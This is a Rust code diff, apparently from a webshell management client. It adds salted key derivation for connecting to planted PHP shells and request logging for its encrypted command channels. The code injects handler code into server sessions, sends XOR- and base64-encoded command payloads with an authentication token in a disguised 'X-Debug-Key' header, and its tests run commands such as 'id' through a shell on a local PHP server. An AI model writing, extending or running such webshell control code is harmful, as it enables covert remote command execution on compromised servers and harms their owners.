@@ -76,6 +76,23 @@ fn encoder_for(protocol_params: &str) -> Result<&'static dyn PayloadEncoder, Pro
     }
 }
 
+/// 有效密码：协议参数里带 `salt` 时用 `salt:password` 派生密钥与令牌，
+/// 与 `generate_shell` 的加盐 stub 保持一致；未带盐时等于原密码。
+fn effective_password(protocol_params: &str, password: &str) -> String {
+    let salt = serde_json::from_str::<serde_json::Value>(protocol_params)
+        .ok()
+        .and_then(|value| {
+            value
+                .get("salt")
+                .and_then(|item| item.as_str().map(str::to_string))
+        })
+        .filter(|salt| !salt.is_empty());
+    match salt {
+        Some(salt) => format!("{salt}:{password}"),
+        None => password.to_string(),
+    }
+}
+
 impl ProtocolPlugin for PhpProtocol {
     fn manifest(&self) -> PluginManifest {
         PluginManifest {
@@ -209,7 +226,7 @@ impl PhpProtocol {
             };
             let php = PhpSession {
                 endpoint: profile.endpoint.clone(),
-                password: profile.password.clone(),
+                password: effective_password(&profile.protocol_params, &profile.password),
                 client,
                 encoder,
                 initialized: std::sync::Mutex::new(false),
@@ -226,7 +243,7 @@ impl PhpProtocol {
             };
             let php = PhpSession {
                 endpoint: profile.endpoint.clone(),
-                password: profile.password.clone(),
+                password: effective_password(&profile.protocol_params, &profile.password),
                 client,
                 encoder,
                 initialized: std::sync::Mutex::new(false),
@@ -916,7 +933,7 @@ impl Protocol for PhpProtocol {
             .unwrap_or(false);
         let session: Box<dyn SessionState> = Box::new(PhpSession {
             endpoint: profile.endpoint.clone(),
-            password: profile.password.clone(),
+            password: effective_password(&profile.protocol_params, &profile.password),
             client,
             encoder,
             initialized: std::sync::Mutex::new(false),
@@ -1609,24 +1626,32 @@ fn info_map(value: &serde_json::Value) -> std::collections::HashMap<String, Stri
 /// 发送一次 body 直传请求（密文），返回 XOR 解密后的明文响应。
 fn session_post(
     php: &PhpSession,
+    action: &str,
+    plaintext: &str,
     body: String,
     settings: &AppSettings,
 ) -> Result<Vec<u8>, ProtocolError> {
-    let response = php
+    let started = std::time::Instant::now();
+    let response = match php
         .client
         .post(&php.endpoint)
         .header("Content-Type", "application/x-www-form-urlencoded")
         .body(body)
         .send()
-        .map_err(|error| ProtocolError::Network(error.to_string()))?;
-    if !response.status().is_success() {
+    {
+        Ok(response) => response,
+        Err(error) => {
+            // 失败请求同样留痕（请求调试页此前对 NATIVE/session 通道完全空白）
+            log_request(php, action, 0, started, plaintext, "");
+            return Err(ProtocolError::Network(error.to_string()));
+        }
+    };
+    let status = response.status();
+    if !status.is_success() {
+        log_request(php, action, status.as_u16(), started, plaintext, "");
         return Err(ProtocolError::HttpStatus(
-            response.status().as_u16(),
-            response
-                .status()
-                .canonical_reason()
-                .unwrap_or("")
-                .to_string(),
+            status.as_u16(),
+            status.canonical_reason().unwrap_or("").to_string(),
         ));
     }
     // S10：流式限长读取（与 native_call 一致）。此前是全量缓冲后再比对上限，
@@ -1642,7 +1667,29 @@ fn session_post(
     }
     // 响应为编码器密文（base64 文本），按编码器解密
     let text = String::from_utf8_lossy(&bytes);
+    log_request(php, action, status.as_u16(), started, plaintext, &text);
     php.encoder.decode(&text, &php.password)
+}
+
+/// 写一条请求调试记录（统一协议 id 与密码脱敏）。
+fn log_request(
+    php: &PhpSession,
+    action: &str,
+    status: u16,
+    started: std::time::Instant,
+    plaintext: &str,
+    response: &str,
+) {
+    crate::protocol::reqlog::record_request(
+        PHP_PROTOCOL_ID,
+        action,
+        &php.endpoint,
+        status,
+        started.elapsed().as_millis() as u64,
+        plaintext,
+        response,
+        &php.password,
+    );
 }
 
 /// 确保处理器代码已注入服务端 session（幂等：已初始化则跳过）。
@@ -1656,7 +1703,7 @@ fn ensure_session_init(php: &PhpSession, settings: &AppSettings) -> Result<(), P
     }
     let code = dosword_sdk::encoder::session_handler_code();
     let payload = php.encoder.encode(code, &php.password);
-    let plain = session_post(php, payload, settings)?;
+    let plain = session_post(php, "session_init", code, payload, settings)?;
     let text = String::from_utf8_lossy(&plain);
     if !text.contains("ok") {
         return Err(ProtocolError::ServerError(format!(
@@ -1684,7 +1731,7 @@ fn session_call(
 
     // session 变体（分阶段载荷）暂不启用 gzip（响应为明文 JSON，结构不兼容压缩）
     let payload = php.encoder.encode(&request, &php.password);
-    let plain = session_post(php, payload, settings)?;
+    let plain = session_post(php, action, &request, payload, settings)?;
     let text = String::from_utf8_lossy(&plain);
 
     // 帧解析（处理器返回 nonce 帧包裹的 base64 JSON）
@@ -1731,22 +1778,27 @@ fn native_call(
     // P2：手动快速转义（仅 +、=、&），避免对整块载荷全量百分号编码
     let body = format!("formData={}", form_escape(&payload));
     let token = &dosword_sdk::encoder::md5_hex(&php.password)[..16];
-    let response = php
+    let started = std::time::Instant::now();
+    let response = match php
         .client
         .post(&php.endpoint)
         .header("Content-Type", "application/x-www-form-urlencoded")
         .header("X-Debug-Key", token)
         .body(body)
         .send()
-        .map_err(|error| ProtocolError::Network(error.to_string()))?;
-    if !response.status().is_success() {
+    {
+        Ok(response) => response,
+        Err(error) => {
+            log_request(php, action, 0, started, &request, "");
+            return Err(ProtocolError::Network(error.to_string()));
+        }
+    };
+    let status = response.status();
+    if !status.is_success() {
+        log_request(php, action, status.as_u16(), started, &request, "");
         return Err(ProtocolError::HttpStatus(
-            response.status().as_u16(),
-            response
-                .status()
-                .canonical_reason()
-                .unwrap_or("")
-                .to_string(),
+            status.as_u16(),
+            status.canonical_reason().unwrap_or("").to_string(),
         ));
     }
     let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
@@ -1759,6 +1811,7 @@ fn native_call(
         )));
     }
     let text = String::from_utf8_lossy(&bytes);
+    log_request(php, action, status.as_u16(), started, &request, &text);
     let outer: Value = serde_json::from_str(&text)
         .map_err(|_| ProtocolError::ParseError("响应不是合法 JSON".to_string()))?;
     let data = outer
@@ -3007,6 +3060,62 @@ except Exception as e:
         // Redis 不走 PDO，必须显式拒绝而不是静默变成 pgsql
         assert!(build_dsn(&base("redis"), true).is_err());
         assert_eq!(build_dsn(&base("sqlite"), true).unwrap(), "sqlite:app");
+    }
+
+    /// 加盐派生：stub 用 `salt:password` 生成，客户端用「原密码 + 盐」连接。
+    #[test]
+    fn salted_key_derivation_round_trip() {
+        let salt = "abc123def4567890";
+        let effective = format!("{salt}:secret");
+        let Some((url, dir, mut child)) = spawn_php_server_with("native", &effective, false) else {
+            eprintln!("跳过：未检测到 php");
+            return;
+        };
+        let settings = settings();
+        let mut profile = profile(&url);
+        profile.password = "secret".to_string();
+        profile.protocol_params = format!(r#"{{"encoder":"native","salt":"{salt}"}}"#);
+        let result = (|| -> Result<String, ProtocolError> {
+            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
+            let out = PhpProtocol.execute_command(session.as_ref(), "printf salt-ok", &settings)?;
+            Ok(out.stdout)
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        assert_eq!(
+            result
+                .unwrap_or_else(|error| panic!("加盐往返应成功：{error}"))
+                .trim(),
+            "salt-ok"
+        );
+    }
+
+    /// 请求调试必须覆盖默认通道：NATIVE（native_call）与分阶段（session_post）。
+    /// 此前两者都不调用 record_request，「请求调试」页在默认编码器下永远是空的。
+    #[test]
+    fn request_debug_records_native_and_session_channels() {
+        let settings = settings();
+        for (encoder_id, session_mode) in [("native", false), ("xor_session", true)] {
+            let Some((url, dir, mut child)) =
+                spawn_php_server_with(encoder_id, "secret", session_mode)
+            else {
+                eprintln!("跳过：未检测到 php");
+                return;
+            };
+            crate::protocol::reqlog::clear_requests();
+            let mut profile = profile(&url);
+            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
+            let (session, _) = PhpProtocol.connect(&profile, &settings).unwrap();
+            let _ = PhpProtocol
+                .execute_command(session.as_ref(), "id", &settings)
+                .unwrap();
+            let records = crate::protocol::reqlog::list_requests(Some(&url), None);
+            assert!(!records.is_empty(), "{encoder_id} 通道应产生请求调试记录");
+            let _ = child.kill();
+            let _ = child.wait();
+            let _ = std::fs::remove_dir_all(&dir);
+        }
     }
 
     /// 未知编码器必须显式报错，而不是静默回退 NATIVE_XOR ——
